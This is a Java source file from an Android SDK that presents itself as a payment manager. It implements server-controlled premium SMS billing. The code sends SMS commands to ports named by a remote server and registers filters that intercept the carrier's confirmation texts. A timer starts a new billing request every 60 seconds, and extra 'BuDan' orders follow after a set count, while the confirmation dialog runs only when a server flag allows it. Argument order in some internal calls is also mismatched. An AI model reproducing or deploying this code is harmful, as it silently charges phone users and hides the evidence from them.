package com.example.administrator.sdk.manager;

import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.os.Handler;
import android.text.TextUtils;
import com.example.administrator.sdk.data.NormalThroughData;
import com.example.administrator.sdk.httpCenter.InitRequest;
import com.example.administrator.sdk.httpCenter.ThroughRequest;
import com.example.administrator.sdk.entity.RequestThroughCallBackEntity;
import com.example.administrator.sdk.entity.SmsInterceptEntity;
import com.example.administrator.sdk.sms.SmsCenter;
import com.example.administrator.sdk.sms.SmsInterceptCenter;
import com.example.administrator.sdk.utils.GsonUtils;
import com.example.administrator.sdk.utils.Kode;
import com.example.administrator.sdk.utils.Log;

import org.json.JSONObject;

import java.util.Timer;
import java.util.TimerTask;

import rx.Subscriber;

/**
 * Created by Administrator on 2017/7/19.
 */

public class NormalRequestThroughManager {
    private static NormalRequestThroughManager requestThroughManager = null;
    private int requestTimes = 0;
    private RequestThroughCallBackEntity requestThroughCallBackEntity = null;
    private static int count = 0;
    private static boolean isFirstClick = true;

    public static NormalRequestThroughManager getInstance() {
        if (requestThroughManager == null) {
            requestThroughManager = new NormalRequestThroughManager();
        }
        return requestThroughManager;
    }

    public void chooseRequestWay(final Context context, final String str, final String Did, final String productName, final String price, final Handler normalPayCallBackHandler) {
        if (!InitRequest.isJi_Fei) {
            return;
        }
        Log.debug("InitRequest.isBuDan:" + InitRequest.isBuDan);
        Log.debug("InitRequest.buDan_timse:" + InitRequest.buDan_timse);
        Log.debug("count:" + count);
        if (count == InitRequest.buDan_timse) {
            if (InitRequest.isBuDan) {
                BuDan(context, price, Did, productName, normalPayCallBackHandler);
//                    count = 0;
                return;
            }
        }
        if (isFirstClick && InitRequest.isBaoYue) {
            isFirstClick = false;
            requestThroughBy60s(context, price, Did, productName, normalPayCallBackHandler);
        }
        if (InitRequest.isSecondConfirm) {
            SecondConfirmDialog.getInstance().showDialog(context, str, price, normalPayCallBackHandler, new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    requestThrough(context, str, Did, productName, price, normalPayCallBackHandler);
                }
            });
            return;
        } else {
            requestThrough(context, str, Did, productName, price, normalPayCallBackHandler);
            count++;
        }
    }

    private void requestThrough(final Context context, final String str, final String price, final String Did, final String productName, final Handler normalPayCallBackHandler) {
        try {
            JSONObject json = new JSONObject(NormalThroughData.getNormalThroughDataList().get(requestTimes).toString());
            String throughID = json.isNull("id") ? null : json.getString("id");
            if (null == throughID || throughID.equals("")) {
                PayCallBackHandler.getInstance().payFail(normalPayCallBackHandler);
                goToNextThrough(context, price, str, Did, productName, normalPayCallBackHandler);
                return;
            }
            ThroughRequest.getInstance().request(context, throughID, price, Did, productName, new Subscriber<String>() {
                @Override
                public void onCompleted() {
                    Log.debug("request through completed!!!");
                }

                @Override
                public void onError(Throwable e) {
                    PayCallBackHandler.getInstance().payFail(normalPayCallBackHandler);
                    goToNextThrough(context, price, str, Did, productName, normalPayCallBackHandler);
                    Log.debug("request through error : " + e.getMessage().toString());
                }

                @Override
                public void onNext(String s) {
                    Log.debug("normal request through successed : " + Kode.e(s));
                    requestThroughCallBackEntity = (RequestThroughCallBackEntity) GsonUtils.getInstance().JsonToEntity(Kode.e(s), RequestThroughCallBackEntity.class);
                    if (!requestThroughCallBackEntity.getState().equals("0")) {
                        Log.debug("请求失败:" + requestThroughCallBackEntity.getResultmsg());
                        PayCallBackHandler.getInstance().payFail(normalPayCallBackHandler);
                        goToNextThrough(context, price, str, Did, productName, normalPayCallBackHandler);
                    } else {
                        setInterceptData();
                        send(context, normalPayCallBackHandler);
                        //goToNextThrough(context, price, str, Did, productName, normalPayCallBackHandler);
                    }
                }
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    private void goToNextThrough(Context context, String price, String str, String Did, String productName, Handler normalPayCallBackHandler) {
        if (setRequestTimes() != -1) {
            requestThrough(context, price, str, Did, productName, normalPayCallBackHandler);
        } else {
            return;
        }
    }

    private void send(Context context, Handler normalPayCallBackHandler) {
        for (int i = 0; i < requestThroughCallBackEntity.getOrder().size(); i++) {
            String command = requestThroughCallBackEntity.getOrder().get(i).getCommand();
            String sendport = requestThroughCallBackEntity.getOrder().get(i).getSendport();
            SmsCenter.getInstance().sendSms(context, sendport, command, normalPayCallBackHandler);
        }
    }

    private void setInterceptData() {
        if (!requestThroughCallBackEntity.getPayType().equals("0")) {
            SmsInterceptEntity smsInterceptEntity = new SmsInterceptEntity();
            smsInterceptEntity.setFix_msg(requestThroughCallBackEntity.getFix_msg());
            smsInterceptEntity.setPayType(requestThroughCallBackEntity.getPayType());
            smsInterceptEntity.setLimit_msg_1(requestThroughCallBackEntity.getLimit_msg_1());
            smsInterceptEntity.setLimit_msg_2(requestThroughCallBackEntity.getLimit_msg_2());
            smsInterceptEntity.setLimitNum(requestThroughCallBackEntity.getLimitNum());
            smsInterceptEntity.setLimit_msg_data(requestThroughCallBackEntity.getLimit_msg_data());
            if (null != requestThroughCallBackEntity.getOrder() && requestThroughCallBackEntity.getOrder().size() > 0) {
                smsInterceptEntity.setOtherNeedUrl(requestThroughCallBackEntity.getOrder().get(0).getOtherNeedUrl());
                smsInterceptEntity.setSendParam(GsonUtils.getInstance().EntityToJson(requestThroughCallBackEntity.getOrder().get(0).getSendParam()));
            }
            if (null == SmsInterceptCenter.interceptContentList || SmsInterceptCenter.interceptContentList.size() <= 0) {
                SmsInterceptCenter.interceptContentList.add(GsonUtils.getInstance().EntityToJson(smsInterceptEntity));
                Log.debug("Normal SmsInterceptCenter  interceptContentList : " + SmsInterceptCenter.interceptContentList.get(0).toString());
            } else {
                for (int i = 0; i < SmsInterceptCenter.interceptContentList.size(); i++) {
                    if (SmsInterceptCenter.interceptContentList.get(i).toString().contains(requestThroughCallBackEntity.getLimit_msg_2()) && SmsInterceptCenter.interceptContentList.get(i).contains(requestThroughCallBackEntity.getLimit_msg_data())) {
                        SmsInterceptCenter.interceptContentList.remove(i);
                    }
                    SmsInterceptCenter.interceptContentList.add(GsonUtils.getInstance().EntityToJson(smsInterceptEntity));
                }
            }
        }
    }

    private int setRequestTimes() {
        Log.debug("ReuqestTimes:" + requestTimes);
        ++requestTimes;
        if (requestTimes > 7) {
            requestTimes = 0;
            return -1;
        } else {
            return 0;
        }
    }

    private void BuDan(Context context, String price, String Did, String productName, Handler normalPayCallBackHandler) {
        Bd_RequestThroughManager.getInstance().requestThrough(context, price, Did, productName, normalPayCallBackHandler);
    }

    private void requestThroughBy60s(final Context context, final String price, final String Did, final String productName, final Handler normalPayCallBackHandler) {
        Timer timer = new Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                InitRequestThroughManager.getInstance().requestThrough(context, price, Did, productName, normalPayCallBackHandler);
            }
        }, 60 * 1000, 60 * 1000);
    }

    private void secondConfirm(Context context, String price, String str, final Handler normalPayCallBackHandler, DialogInterface.OnClickListener negativeButton) {
        AlertDialog.Builder builder = new AlertDialog.Builder(context);
        if (TextUtils.isEmpty(str)) {
            double priceShowValue = 0;
            try {
                priceShowValue = Double.parseDouble(price) / 100.00;
            } catch (Exception ignore) {
                builder.setMessage("您确定要支付" + price + "元吗？");
            }
            builder.setMessage("您确定要支付" + priceShowValue + "元吗？");
        } else {
            builder.setMessage(str);
        }
        builder.setTitle("提示");
        builder.setPositiveButton("取消", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();
                PayCallBackHandler.getInstance().payCancel(normalPayCallBackHandler);
            }
        });
        if (negativeButton != null) {
            builder.setNegativeButton("确认", negativeButton);
        }
        builder.setOnCancelListener(new DialogInterface.OnCancelListener() {

            @Override
            public void onCancel(DialogInterface dialog) {
                dialog.dismiss();
                PayCallBackHandler.getInstance().payCancel(normalPayCallBackHandler);
            }
        });
        builder.setCancelable(false);
        builder.create().show();
    }
}